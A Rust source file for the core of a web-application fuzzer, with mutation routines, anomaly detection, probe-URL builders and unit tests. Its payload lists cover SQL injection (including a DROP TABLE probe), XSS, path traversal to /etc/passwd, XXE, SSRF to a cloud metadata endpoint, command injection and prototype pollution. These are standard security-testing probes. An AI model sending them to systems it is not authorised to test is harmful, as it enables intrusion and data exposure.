//! Core fuzzing logic: no `tokio`, no `reqwest`. Safe to compile for `wasm32-unknown-unknown`
//! and load in Cloudflare Workers / Lambda@Edge as a WASM module.

pub const USER_AGENT: &str =
    "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 WeissmanFuzzCore/1.0";

pub const BASELINE_REQUESTS: usize = 3;
pub const RATE_LIMIT_DELAY_MS: u64 = 200;
pub const TIME_ANOMALY_MULTIPLIER: f64 = 5.0;
pub const LENGTH_ANOMALY_RATIO: f64 = 2.0;

pub static DANGEROUS_SUFFIXES: &[&str] = &[
    // Null byte / encoding
    "%00",
    "\\x00",
    "\u{0000}",
    // SQL injection
    "'",
    "\"",
    "' OR '1'='1",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "1; DROP TABLE users--",
    // XSS
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    // Path traversal / LFI
    "../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    // SSTI (Server-Side Template Injection)
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    "<%= 7*7 %>",
    "{{config}}",
    "${{<%[%'\"}}%\\",
    // XXE (XML External Entity)
    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
    // SSRF probes (safe: loopback / metadata endpoint patterns)
    "http://169.254.169.254/latest/meta-data/",
    "http://127.0.0.1/",
    "http://[::1]/",
    // Command injection
    "; id",
    "| id",
    "`id`",
    "$(id)",
    // NoSQL injection
    "{\"$gt\": \"\"}",
    "{\"$where\": \"1==1\"}",
    // CRLF injection (header splitting)
    "\r\nX-Injected: weissman",
    "%0d%0aX-Injected:%20weissman",
];

#[derive(Clone, Debug, serde::Serialize, serde::Deserialize)]
pub struct Baseline {
    pub avg_latency_ms: f64,
    pub status: u16,
    pub content_length: usize,
}

#[derive(Clone, Debug, serde::Serialize, serde::Deserialize)]
pub struct ValidatedAnomaly {
    pub target_url: String,
    pub payload: String,
    pub anomaly_type: String,
    pub baseline_vs_anomaly: String,
    /// Set when anomaly was confirmed via out-of-band / OAST callback correlation.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub oob_token: Option<String>,
    /// vLLM user prompt that produced this payload (generative fuzzing provenance).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub llm_user_prompt: Option<String>,
}

#[derive(Clone, Debug)]
pub struct Mutator {
    base: String,
}

impl Mutator {
    pub fn new(base: impl Into<String>) -> Self {
        Self { base: base.into() }
    }

    pub fn base(&self) -> &str {
        &self.base
    }

    pub fn bit_flip(&self) -> String {
        let mut bytes: Vec<u8> = self.base.as_bytes().to_vec();
        if bytes.is_empty() {
            return self.base.clone();
        }
        let i = bytes.len() / 2;
        bytes[i] = bytes[i].wrapping_add(1);
        String::from_utf8_lossy(&bytes).into_owned()
    }

    pub fn byte_swap(&self) -> String {
        let mut bytes: Vec<u8> = self.base.as_bytes().to_vec();
        if bytes.len() < 2 {
            return self.base.clone();
        }
        let i = bytes.len() / 2;
        let j = (i + 1).min(bytes.len() - 1);
        bytes.swap(i, j);
        String::from_utf8_lossy(&bytes).into_owned()
    }

    pub fn dangerous_suffix(&self, index: usize) -> String {
        let s = DANGEROUS_SUFFIXES
            .get(index % DANGEROUS_SUFFIXES.len())
            .unwrap_or(&"'");
        format!("{}{}", self.base, s)
    }

    pub fn massive_length(&self, count: usize) -> String {
        let pad = "A".repeat(count.min(100_000));
        format!("{}{}", self.base, pad)
    }

    pub fn mutations(&self) -> Vec<String> {
        let mut out = Vec::new();
        out.push(self.base.clone());
        out.push(self.bit_flip());
        out.push(self.byte_swap());
        for i in 0..DANGEROUS_SUFFIXES.len() {
            out.push(self.dangerous_suffix(i));
        }
        out.push(self.massive_length(10_000));
        out.push(self.massive_length(50_000));
        out
    }

    /// Structure-aware variants (JSON body or `application/x-www-form-urlencoded` style).
    #[must_use]
    pub fn smart_mutations(&self) -> Vec<String> {
        smart_payload_mutations(&self.base)
    }
}

/// Heuristic JSON / form-aware mutations (keeps parseable structure where possible).
#[must_use]
pub fn smart_payload_mutations(base: &str) -> Vec<String> {
    let t = base.trim();
    if t.starts_with('{') && t.ends_with('}') {
        return smart_json_object_mutations(t);
    }
    if t.starts_with('[') && t.ends_with(']') {
        return smart_json_array_mutations(t);
    }
    if looks_like_form_urlencoded(t) {
        return smart_form_urlencoded_mutations(t);
    }
    Vec::new()
}

fn looks_like_form_urlencoded(s: &str) -> bool {
    if !s.contains('=') || s.starts_with('{') {
        return false;
    }
    let sample: String = s.chars().take(2048).collect();
    !sample.contains('\n')
        && sample.split('&').take(5).all(|p| {
            p.split_once('=')
                .map(|(k, _)| !k.trim().is_empty())
                .unwrap_or(false)
        })
}

fn smart_json_object_mutations(json_str: &str) -> Vec<String> {
    let Ok(mut v) = serde_json::from_str::<serde_json::Value>(json_str) else {
        return Vec::new();
    };
    let Some(obj) = v.as_object_mut() else {
        return Vec::new();
    };
    let keys: Vec<String> = obj.keys().cloned().collect();
    let mut out = Vec::new();

    for k in &keys {
        let Some(orig) = obj.get(k).cloned() else {
            continue;
        };
        match orig {
            serde_json::Value::String(s) => {
                let mut m = obj.clone();
                m.insert(
                    k.clone(),
                    serde_json::Value::String(format!("{s}' OR '1'='1")),
                );
                if let Ok(s2) = serde_json::to_string(&serde_json::Value::Object(m.clone())) {
                    out.push(s2);
                }
                m.insert(
                    k.clone(),
                    serde_json::Value::String(format!(
                        "<svg onload=alert('{}')>",
                        XSS_REFLECTION_TOKEN
                    )),
                );
                if let Ok(s2) = serde_json::to_string(&serde_json::Value::Object(m)) {
                    out.push(s2);
                }
            }
            serde_json::Value::Number(_) => {
                for probe in integer_probe_values() {
                    let mut m = obj.clone();
                    m.insert(k.clone(), probe.clone());
                    if let Ok(s2) = serde_json::to_string(&serde_json::Value::Object(m)) {
                        out.push(s2);
                    }
                }
            }
            serde_json::Value::Bool(b) => {
                let mut m = obj.clone();
                m.insert(k.clone(), serde_json::Value::Bool(!b));
                if let Ok(s2) = serde_json::to_string(&serde_json::Value::Object(m)) {
                    out.push(s2);
                }
            }
            serde_json::Value::Null => {
                let mut m = obj.clone();
                m.insert(k.clone(), serde_json::json!(0));
                if let Ok(s2) = serde_json::to_string(&serde_json::Value::Object(m)) {
                    out.push(s2);
                }
            }
            serde_json::Value::Array(arr) => {
                if arr.is_empty() {
                    continue;
                }
                let mut a = arr.clone();
                if let Some(first) = a.get_mut(0) {
                    if first.is_number() {
                        *first = serde_json::json!(2147483647);
                    } else if first.is_boolean() {
                        *first = serde_json::json!(!first.as_bool().unwrap_or(false));
                    } else if first.is_string() {
                        *first = serde_json::Value::String(format!(
                            "<svg onload=alert('{}')>",
                            XSS_REFLECTION_TOKEN
                        ));
                    }
                    let mut m = obj.clone();
                    m.insert(k.clone(), serde_json::Value::Array(a));
                    if let Ok(s2) = serde_json::to_string(&serde_json::Value::Object(m)) {
                        out.push(s2);
                    }
                }
            }
            serde_json::Value::Object(_) => {}
        }
    }

    let mut proto = obj.clone();
    proto.insert(
        "__proto__".to_string(),
        serde_json::json!({"polluted": true, "admin": true}),
    );
    if let Ok(s) = serde_json::to_string(&serde_json::Value::Object(proto)) {
        out.push(s);
    }

    let mut ctor = obj.clone();
    ctor.insert(
        "constructor".to_string(),
        serde_json::json!({"prototype": {"isAdmin": true}}),
    );
    if let Ok(s) = serde_json::to_string(&serde_json::Value::Object(ctor)) {
        out.push(s);
    }

    let mut nosql = obj.clone();
    nosql.insert("$where".to_string(), serde_json::json!("1==1"));
    nosql.insert("$gt".to_string(), serde_json::json!(""));
    if let Ok(s) = serde_json::to_string(&serde_json::Value::Object(nosql)) {
        out.push(s);
    }

    out.sort();
    out.dedup();
    out
}

fn smart_json_array_mutations(json_str: &str) -> Vec<String> {
    let Ok(arr) = serde_json::from_str::<Vec<serde_json::Value>>(json_str) else {
        return Vec::new();
    };
    if arr.is_empty() {
        return vec![format!("[\"' OR '1'='1\"]")];
    }
    let mut out = Vec::new();
    for (i, item) in arr.iter().enumerate() {
        let mut c = arr.clone();
        match item {
            serde_json::Value::String(s) => {
                c[i] = serde_json::Value::String(format!("{s}' OR '1'='1"));
                if let Ok(s) = serde_json::to_string(&c) {
                    out.push(s);
                }
                let mut c2 = arr.clone();
                c2[i] = serde_json::Value::String(format!(
                    "<svg onload=alert('{}')>",
                    XSS_REFLECTION_TOKEN
                ));
                if let Ok(s) = serde_json::to_string(&c2) {
                    out.push(s);
                }
            }
            serde_json::Value::Number(_) => {
                for probe in integer_probe_values() {
                    c[i] = probe.clone();
                    if let Ok(s) = serde_json::to_string(&c) {
                        out.push(s);
                    }
                }
            }
            serde_json::Value::Bool(b) => {
                c[i] = serde_json::Value::Bool(!b);
                if let Ok(s) = serde_json::to_string(&c) {
                    out.push(s);
                }
            }
            serde_json::Value::Null => {
                c[i] = serde_json::json!(0);
                if let Ok(s) = serde_json::to_string(&c) {
                    out.push(s);
                }
            }
            _ => {}
        }
    }
    out
}

fn integer_probe_values() -> Vec<serde_json::Value> {
    vec![
        serde_json::json!(-1),
        serde_json::json!(0),
        serde_json::json!(1),
        serde_json::json!(2147483647),
        serde_json::json!(-2147483648i64),
        serde_json::json!(9223372036854775807i64),
        serde_json::json!(i64::MIN),
        serde_json::json!(9999999999i64),
    ]
}

fn smart_form_urlencoded_mutations(form: &str) -> Vec<String> {
    let mut pairs: Vec<(String, String)> = Vec::new();
    for seg in form.split('&') {
        if let Some((k, v)) = seg.split_once('=') {
            let key = urlencoding::decode(k)
                .unwrap_or_else(|_| k.into())
                .to_string();
            let val = urlencoding::decode(v)
                .unwrap_or_else(|_| v.into())
                .to_string();
            pairs.push((key, val));
        }
    }
    if pairs.is_empty() {
        return Vec::new();
    }
    let mut out = Vec::new();
    for i in 0..pairs.len() {
        let mut c = pairs.clone();
        c[i].1 = format!("{}' OR '1'='1", c[i].1);
        out.push(encode_form_pairs(&c));
        let mut c2 = pairs.clone();
        c2[i].1 = format!("<svg onload=alert('{}')>", XSS_REFLECTION_TOKEN);
        out.push(encode_form_pairs(&c2));
    }
    out.sort();
    out.dedup();
    out
}

fn encode_form_pairs(pairs: &[(String, String)]) -> String {
    pairs
        .iter()
        .map(|(k, v)| format!("{}={}", urlencoding::encode(k), urlencoding::encode(v)))
        .collect::<Vec<_>>()
        .join("&")
}

pub fn is_anomaly(
    baseline: &Baseline,
    status: u16,
    content_length: usize,
    latency_ms: f64,
) -> Option<String> {
    if status == 500 {
        return Some("Status 500 (Internal Server Error / Crash)".to_string());
    }
    if baseline.avg_latency_ms > 0.0
        && latency_ms >= baseline.avg_latency_ms * TIME_ANOMALY_MULTIPLIER
    {
        return Some(format!(
            "Response time anomaly ({} ms vs baseline ~{} ms)",
            latency_ms as u64, baseline.avg_latency_ms as u64
        ));
    }
    let base_len = baseline.content_length.max(1);
    if content_length >= (base_len as f64 * LENGTH_ANOMALY_RATIO) as usize
        || (base_len > 100 && content_length < base_len / 4)
    {
        return Some(format!(
            "Content-Length anomaly ({} vs baseline ~{})",
            content_length, baseline.content_length
        ));
    }
    None
}

/// Common reflectable parameter names for injection probes (GET).
pub static INJECTION_PARAM_NAMES: &[&str] = &[
    "id", "q", "query", "search", "s", "keyword", "name", "user", "username", "email", "page",
    "sort", "order", "filter", "cat", "category", "file", "path", "url", "redirect", "next",
    "callback", "token",
];

/// SQL error / boolean-style probes (encoded by `append_query_param`).
pub static SQLI_PROBE_PAYLOADS: &[&str] = &[
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "1' AND '1'='1",
    "1 AND 1=1",
    "1 AND 1=2",
    "' UNION SELECT NULL--",
    "1; SELECT pg_sleep(0)--",
];

/// Unique token embedded in XSS probes to detect reflection without executing script in our checker.
pub const XSS_REFLECTION_TOKEN: &str = "weissman_xss_prb_9f3a";

/// Builds GET URLs with synthetic query parameters for injection testing (capped).
#[must_use]
pub fn build_param_injection_probe_urls(base_url: &str, max_urls: usize) -> Vec<String> {
    let mut out = Vec::new();
    let base = base_url.trim();
    if base.is_empty() {
        return out;
    }
    let xss_payloads = [
        format!("<svg onload=alert('{}')>", XSS_REFLECTION_TOKEN),
        format!("\"><img src=x onerror=alert('{}')>", XSS_REFLECTION_TOKEN),
        format!("'><script>{}</script>", XSS_REFLECTION_TOKEN),
    ];
    for param in INJECTION_PARAM_NAMES {
        for payload in SQLI_PROBE_PAYLOADS {
            if out.len() >= max_urls {
                return out;
            }
            out.push(append_query_param(base, param, payload));
        }
        for xss in &xss_payloads {
            if out.len() >= max_urls {
                return out;
            }
            out.push(append_query_param(base, param, xss));
        }
    }
    out
}

#[must_use]
pub fn looks_like_sqli_response(body: &str) -> bool {
    let b = body.to_lowercase();
    b.contains("sql syntax")
        || b.contains("mysql") && (b.contains("error in your sql") || b.contains("mysqli"))
        || b.contains("postgresql") && b.contains("error")
        || b.contains("sqlite") && (b.contains("syntax error") || b.contains("sqlite3"))
        || b.contains("ora-")
        || b.contains("microsoft ole db")
        || b.contains("odbc sql server driver")
        || b.contains("unclosed quotation mark")
        || b.contains("quoted string not properly terminated")
}

#[must_use]
pub fn reflected_xss_indicated(body: &str) -> bool {
    body.contains(XSS_REFLECTION_TOKEN)
}

pub fn append_query_param(base_url: &str, param: &str, value: &str) -> String {
    let encoded = urlencoding::encode(value);
    if base_url.contains('?') {
        format!("{}&{}={}", base_url, param, encoded)
    } else {
        format!("{}?{}={}", base_url, param, encoded)
    }
}

/// Load AI-guided payloads (native only). WASM callers pass payloads from JS/host.
#[cfg(not(target_arch = "wasm32"))]
pub fn load_guided_payloads_from_file(path: &str) -> Vec<String> {
    use std::io::BufRead;
    let mut out = Vec::new();
    if let Ok(f) = std::fs::File::open(path) {
        for s in std::io::BufReader::new(f).lines().map_while(Result::ok) {
            let s = s.trim().to_string();
            if !s.is_empty() {
                out.push(s);
            }
        }
    }
    out
}

#[cfg(target_arch = "wasm32")]
pub fn load_guided_payloads_from_file(_path: &str) -> Vec<String> {
    Vec::new()
}

/// Merge guided payloads, structure-aware smart mutations, and byte-level mutator variants (deduped).
pub fn resolve_mutations(mutator: &Mutator, guided: &[String]) -> Vec<String> {
    let smart = mutator.smart_mutations();
    let classic = mutator.mutations();
    let mut seen = std::collections::HashSet::<String>::new();
    let mut out = Vec::new();
    for s in guided
        .iter()
        .map(String::as_str)
        .chain(smart.iter().map(String::as_str))
        .chain(classic.iter().map(String::as_str))
    {
        let owned = s.to_string();
        if seen.insert(owned.clone()) {
            out.push(owned);
        }
    }
    out
}

/// WASM export: build mutation list from base string (no filesystem).
#[cfg(target_arch = "wasm32")]
#[no_mangle]
pub extern "C" fn fuzz_core_wasm_abi_version() -> u32 {
    1
}

#[cfg(all(test, not(target_arch = "wasm32")))]
mod tests {
    use super::*;

    fn baseline(avg: f64, status: u16, len: usize) -> Baseline {
        Baseline {
            avg_latency_ms: avg,
            status,
            content_length: len,
        }
    }

    // ---- Mutator ----------------------------------------------------------

    #[test]
    fn mutator_base_roundtrips() {
        let m = Mutator::new("payload");
        assert_eq!(m.base(), "payload");
    }

    #[test]
    fn bit_flip_changes_middle_byte() {
        let m = Mutator::new("AAAA");
        let flipped = m.bit_flip();
        // Middle byte (index 2) incremented: 'A' (0x41) -> 'B' (0x42).
        assert_eq!(flipped, "AABA");
        assert_ne!(flipped, m.base());
    }

    #[test]
    fn bit_flip_empty_is_noop() {
        let m = Mutator::new("");
        assert_eq!(m.bit_flip(), "");
    }

    #[test]
    fn byte_swap_swaps_two_bytes() {
        let m = Mutator::new("abcd");
        // len=4, i=2, j=3 -> swap 'c' and 'd'.
        assert_eq!(m.byte_swap(), "abdc");
    }

    #[test]
    fn byte_swap_short_input_is_noop() {
        assert_eq!(Mutator::new("a").byte_swap(), "a");
        assert_eq!(Mutator::new("").byte_swap(), "");
    }

    #[test]
    fn dangerous_suffix_wraps_index() {
        let m = Mutator::new("x");
        let n = DANGEROUS_SUFFIXES.len();
        // index and index+n select the same suffix (modular wrap).
        assert_eq!(m.dangerous_suffix(0), m.dangerous_suffix(n));
        assert!(m.dangerous_suffix(0).starts_with('x'));
    }

    #[test]
    fn massive_length_is_capped() {
        let m = Mutator::new("");
        let big = m.massive_length(1_000_000);
        assert_eq!(big.len(), 100_000);
        let small = m.massive_length(10);
        assert_eq!(small.len(), 10);
    }

    #[test]
    fn mutations_include_base_and_variants() {
        let m = Mutator::new("seed");
        let muts = m.mutations();
        assert_eq!(muts[0], "seed");
        // base + bit_flip + byte_swap + all suffixes + 2 massive_length entries.
        assert_eq!(muts.len(), 3 + DANGEROUS_SUFFIXES.len() + 2);
    }

    // ---- smart mutations --------------------------------------------------

    #[test]
    fn smart_mutations_for_json_object() {
        let muts = smart_payload_mutations(r#"{"name":"bob","age":30}"#);
        assert!(!muts.is_empty());
        // Prototype pollution and NoSQL operator payloads are always appended.
        assert!(muts.iter().any(|s| s.contains("__proto__")));
        assert!(muts.iter().any(|s| s.contains("$where")));
        // SQLi mutation of the string field.
        assert!(muts.iter().any(|s| s.contains("OR '1'='1")));
    }

    #[test]
    fn smart_mutations_for_json_array() {
        let muts = smart_payload_mutations(r#"["a","b"]"#);
        assert!(muts.iter().any(|s| s.contains("OR '1'='1")));
        assert!(muts.iter().any(|s| s.contains(XSS_REFLECTION_TOKEN)));
    }

    #[test]
    fn smart_mutations_empty_json_array() {
        let muts = smart_payload_mutations("[]");
        assert_eq!(muts, vec![r#"["' OR '1'='1"]"#.to_string()]);
    }

    #[test]
    fn smart_mutations_for_form_urlencoded() {
        let muts = smart_payload_mutations("user=bob&pass=secret");
        assert!(!muts.is_empty());
        assert!(muts.iter().any(|s| s.contains("OR")));
    }

    #[test]
    fn smart_mutations_unknown_shape_is_empty() {
        assert!(smart_payload_mutations("plain text no structure").is_empty());
    }

    #[test]
    fn integer_probes_cover_boundaries() {
        let probes = integer_probe_values();
        assert!(probes.contains(&serde_json::json!(2147483647)));
        assert!(probes.contains(&serde_json::json!(i64::MIN)));
        assert!(probes.contains(&serde_json::json!(0)));
    }

    #[test]
    fn form_urlencoded_detection() {
        assert!(looks_like_form_urlencoded("a=1&b=2"));
        assert!(!looks_like_form_urlencoded("{\"a\":1}"));
        assert!(!looks_like_form_urlencoded("no equals here"));
        assert!(!looks_like_form_urlencoded("=novalue"));
    }

    // ---- anomaly detection ------------------------------------------------

    #[test]
    fn anomaly_on_status_500() {
        let b = baseline(100.0, 200, 500);
        assert!(is_anomaly(&b, 500, 500, 100.0).unwrap().contains("500"));
    }

    #[test]
    fn anomaly_on_latency_spike() {
        let b = baseline(100.0, 200, 500);
        let a = is_anomaly(&b, 200, 500, 600.0);
        assert!(a.unwrap().contains("Response time anomaly"));
    }

    #[test]
    fn anomaly_on_content_length_growth() {
        let b = baseline(100.0, 200, 500);
        let a = is_anomaly(&b, 200, 1000, 100.0);
        assert!(a.unwrap().contains("Content-Length anomaly"));
    }

    #[test]
    fn anomaly_on_content_length_shrink() {
        let b = baseline(100.0, 200, 1000);
        // base_len>100 and content < base/4 (250).
        let a = is_anomaly(&b, 200, 100, 100.0);
        assert!(a.unwrap().contains("Content-Length anomaly"));
    }

    #[test]
    fn no_anomaly_for_normal_response() {
        let b = baseline(100.0, 200, 500);
        assert!(is_anomaly(&b, 200, 500, 100.0).is_none());
    }

    // ---- injection probe URL building ------------------------------------

    #[test]
    fn injection_probe_urls_respect_cap() {
        let urls = build_param_injection_probe_urls("https://x.test/", 5);
        assert_eq!(urls.len(), 5);
        assert!(urls.iter().all(|u| u.starts_with("https://x.test/?")));
    }

    #[test]
    fn injection_probe_urls_empty_base() {
        assert!(build_param_injection_probe_urls("   ", 10).is_empty());
    }

    #[test]
    fn append_query_param_first_and_subsequent() {
        assert_eq!(
            append_query_param("http://x/", "id", "1 2"),
            "http://x/?id=1%202"
        );
        assert_eq!(
            append_query_param("http://x/?a=b", "id", "v"),
            "http://x/?a=b&id=v"
        );
    }

    // ---- response signal heuristics --------------------------------------

    #[test]
    fn sqli_response_detection() {
        assert!(looks_like_sqli_response(
            "You have an error in your SQL syntax near ..."
        ));
        assert!(looks_like_sqli_response(
            "Warning: mysqli error in your sql"
        ));
        assert!(looks_like_sqli_response("ORA-01756: quoted string"));
        assert!(!looks_like_sqli_response("perfectly normal html page"));
    }

    #[test]
    fn xss_reflection_detection() {
        assert!(reflected_xss_indicated(&format!(
            "<b>{XSS_REFLECTION_TOKEN}</b>"
        )));
        assert!(!reflected_xss_indicated("no token here"));
    }

    // ---- resolve_mutations dedup -----------------------------------------

    #[test]
    fn resolve_mutations_dedupes_and_prioritizes_guided() {
        let m = Mutator::new("seed");
        let guided = vec!["seed".to_string(), "guided_unique".to_string()];
        let out = resolve_mutations(&m, &guided);
        // Guided entries come first; "seed" appears exactly once despite being
        // in guided AND classic mutations.
        assert_eq!(out.iter().filter(|s| *s == "seed").count(), 1);
        assert_eq!(out[0], "seed");
        assert!(out.contains(&"guided_unique".to_string()));
    }

    // ---- file loader ------------------------------------------------------

    #[test]
    fn load_guided_payloads_trims_and_skips_blank() {
        let dir = std::env::temp_dir();
        let path = dir.join("fuzz_core_guided_test.txt");
        std::fs::write(&path, "  a  \n\n b \n").unwrap();
        let loaded = load_guided_payloads_from_file(path.to_str().unwrap());
        assert_eq!(loaded, vec!["a".to_string(), "b".to_string()]);
        let _ = std::fs::remove_file(&path);
    }

    #[test]
    fn load_guided_payloads_missing_file_is_empty() {
        assert!(load_guided_payloads_from_file("/nonexistent/weissman/xyz.txt").is_empty());
    }
}
